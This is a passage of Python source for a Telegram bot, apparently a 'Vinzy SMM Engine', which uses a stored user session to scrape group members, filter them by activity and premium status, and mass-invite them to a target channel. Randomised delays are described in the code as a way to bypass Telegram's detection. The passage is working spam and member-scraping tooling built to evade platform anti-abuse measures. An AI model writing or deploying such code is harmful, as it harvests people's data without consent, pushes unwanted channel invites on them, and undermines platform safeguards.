        await bot.reply_to(message, response, parse_mode="HTML")
        
    except (IndexError, Exception) as e:
        logger.error(f"Dynamic Scrape Error: {e}")
        await bot.reply_to(message, "❌ <b>Format Error:</b> Use <code>/group @GroupUsername</code>")

@bot.message_handler(func=lambda m: True)
async def handle_dynamic_inputs(message):
    """
    STAGE 2: TARGET CAPTURE & STRATEGY SELECTION
    Processes the second input (Target) and generates the Strategy UI.
    """
    user_id = message.from_user.id
    await db.connect()
    user_data = await db.get_user(user_id)
    
    # Gatekeeper: Only process if the user is in the correct setup state
    if not user_data or user_data['bot_state'] != "WAITING_FOR_TARGET":
        return

    try:
        target_channel = message.text.replace("@", "").strip()
        
        # Update target and transition state
        await db.execute_query(
            "UPDATE vinzy_engine_users SET target_channel = $1, bot_state = $2 WHERE user_id = $3",
            target_channel, "SELECTING_SEGMENT", user_id
        )
        
        # CRITICAL RE-FETCH: Ensures user_data contains the source_group for the UI
        user_data = await db.get_user(user_id)
        
        # Inline UI for Segment targeting
        markup = bot_types.InlineKeyboardMarkup()
        markup.row(
            bot_types.InlineKeyboardButton("🔥 ACTIVE", callback_data="select_segment_ACTIVE"),
            bot_types.InlineKeyboardButton("💤 INACTIVE", callback_data="select_segment_INACTIVE")
        )
        
        setup_text = (
            f"✅ <b>Bridge Configuration Success!</b>\n"
            f"{UI_LINE}\n"
            f"📤 <b>Source:</b> <code>@{user_data['source_group']}</code>\n"
            f"📥 <b>Target:</b> <code>@{target_channel}</code>\n\n"
            f"<b>Select your member targeting strategy:</b>"
        )
        await bot.send_message(message.chat.id, setup_text, reply_markup=markup, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Stage 2 UI Crash: {e}")
        await bot.send_message(message.chat.id, "🚨 <b>Engine Error:</b> UI Generation failed. Check logs.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("select_segment_"))
async def handle_segment_selection(call):
    """
    STAGE 3: TARGETING OVERRIDE & UI PREPARATION
    Finalizes targeting parameters before deployment.
    """
    segment = call.data.replace("select_segment_", "")
    user_id = call.from_user.id
    
    await db.connect()
    await db.update_state(user_id, f"READY_{segment}")
    
    markup = bot_types.InlineKeyboardMarkup()
    markup.add(bot_types.InlineKeyboardButton("🚀 DEPLOY TITAN WORKER", callback_data="deploy_worker"))
    
    status_ui = (
        f"🎯 <b>Segment Locked:</b> <code>{segment.upper()}</code>\n"
        f"{UI_LINE}\n"
        f"🛡️ <b>Strategy:</b> Anti-Premium / 2026 Stealth\n"
        f"⚙️ <b>Engine:</b> Titan-Async V8.8 Primed\n\n"
        f"<i>Deployment is authorized. Press below to ignite the worker.</i>"
    )
    
    await bot.edit_message_text(status_ui, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data == "deploy_worker")
async def execute_smm_sequence(call):
    """
    STAGE 4: ENGINE IGNITION & WORKER DISPATCH
    """
    user_id = call.from_user.id
    await db.connect()
    user_data = await db.get_user(user_id)
    
    if not user_data or "READY" not in user_data['bot_state']:
        return await bot.answer_callback_query(call.id, "⚠️ Error: Please complete setup first.", show_alert=True)
        
    await bot.edit_message_text(
        "🚀 <b>WORKER DEPLOYED:</b> Initializing Telethon Handshake...\n"
        "<i>Establishing secure node connection...</i>", 
        call.message.chat.id, call.message.message_id, parse_mode="HTML"
    )
    
    # Critical: Lock state to WORKING to prevent thread collisions
    await db.update_state(user_id, "WORKING")
    
    asyncio.create_task(background_invite_task(call.message.chat.id, user_data))

async def background_invite_task(chat_id, user_data):
    """
    STAGE 5: CORE WORKER EXECUTION (THE ENGINE)
    """
    # Import necessary types for the filter logic
    from telethon import functions, types as tl_types
    
    client = TelegramClient(StringSession(user_data['session_string']), API_ID, API_HASH)
    
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return await bot.send_message(chat_id, "❌ <b>Session Expired:</b> Link again via /start.")

        # FEATURE: Auto-Join to bypass the 'entity not found' bug
        try:
            await client(functions.channels.JoinChannelRequest(channel=user_data['source_group']))
        except Exception:
            pass 

        # HANDSHAKE: Resolve entities for both nodes
        source_ent = await client.get_entity(user_data['source_group'])
        target_ent = await client.get_entity(user_data['target_channel'])
        
        # PHASE 1: Neural Scraping & Filtering
        status_msg = await bot.send_message(chat_id, "🔍 <b>Scraping Metadata...</b>", parse_mode="HTML")
        participants = await client.get_participants(source_ent, limit=1000)
        
        targets = []
        is_active_mode = "ACTIVE" in user_data['bot_state']
        
        for p in participants:
            # FEATURE: Anti-Premium & Bot Protection
            if p.bot or p.deleted or getattr(p, 'premium', False): 
                continue
            
            # Targeting Logic based on User Status
            status = p.status
            if is_active_mode and isinstance(status, (tl_types.UserStatusRecently, tl_types.UserStatusOnline)):
                targets.append(p)
            elif not is_active_mode and not isinstance(status, (tl_types.UserStatusRecently, tl_types.UserStatusOnline)):
                targets.append(p)

        # FEATURE: Safety Cap (Max 50 per run)
        final_targets = targets[:50] 
        total_count = len(final_targets)

        if total_count == 0:
            return await bot.edit_message_text("❌ <b>Zero Targets:</b> No matching users found.", chat_id, status_msg.message_id)

        # PHASE 2: Packet Dispatch & Telemetry
        success, fail = 0, 0
        for index, user in enumerate(final_targets):
            try:
                await client(functions.channels.InviteToChannelRequest(target_ent, [user.id]))
                success += 1
            except errors.FloodWaitError as e:
                await bot.send_message(chat_id, f"⏳ <b>Flood Triggered:</b> Cooling for {e.seconds}s.")
                await asyncio.sleep(e.seconds)
            except Exception:
                fail += 1

            # UI Refresh every 5 users
            if (index + 1) % 5 == 0 or (index + 1) == total_count:
                # Progress bar calculation (simple version)
                filled = int((index + 1) / total_count * 10)
                bar = "🟢" * filled + "⚪" * (10 - filled)
                
                progress_ui = (
                    f"🚀 <b>Vinzy Engine Activity</b>\n{UI_LINE}\n"
                    f"📊 <b>Progress:</b> {index + 1}/{total_count}\n<code>{bar}</code>\n\n"
                    f"✅ Success: <code>{success}</code> | ❌ Restricted: <code>{fail}</code>\n"
                    f"🛡️ <b>Stealth:</b> Active (V8.8)"
                )
                await bot.edit_message_text(progress_ui, chat_id, status_msg.message_id, parse_mode="HTML")
            
            # FEATURE: Stealth Latency (35-65s) to bypass 2026 detection
            if (index + 1) < total_count:
                await asyncio.sleep(random.randint(35, 65))

        # PHASE 3: Mission Finalization
        final_report = (
            f"🏁 <b>Mission Accomplished!</b>\n"
            f"{UI_LINE}\n"
            f"✅ <b>Total Added:</b> <code>{success}</code>\n"
            f"⚠️ <b>Privacy Skips:</b> <code>{fail}</code>\n\n"
            f"<i>Your worker node is now resting.</i>"
        )
        await bot.send_message(chat_id, final_report, parse_mode="HTML")

    except Exception as fatal_err:
        logger.critical(f"FATAL ENGINE ERROR: {fatal_err}")
        await bot.send_message(chat_id, f"🚨 <b>Critical failure:</b> {str(fatal_err)}")
    finally:
        # Revert state and decommission client
        await db.update_state(user_data['user_id'], "IDLE")
        await client.disconnect()
# =========================================================================
# --- 9. APPLICATION RUNTIME & CRASH PROTECTION ---
# =========================================================================

async def main():
    """
    SYSTEM HEARTBEAT:
    Ensures persistent database connectivity and handles polling recovery.
    """
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("   🚀 VINZY SMM ENGINE V8.8 - ONLINE")
    print("   📡 STATUS: DEPLOYED ON KOYEB")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    await db.connect()
    
    # INFINITE POLLING LOOP: Recovers from network or API errors automatically
    while True:
        try:
            # timeout=120 ensures the connection doesn't drop on Koyeb's proxy
            await bot.infinity_polling(
                skip_pending=True, 
                timeout=120, 
                request_timeout=150
            )
        except Exception as e:
            logger.error(f"🔄 Engine Stalled: {e}. Re-igniting in 15s...")
            await asyncio.sleep(15)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🔌 MANUAL SHUTDOWN: Engine Disconnected.")
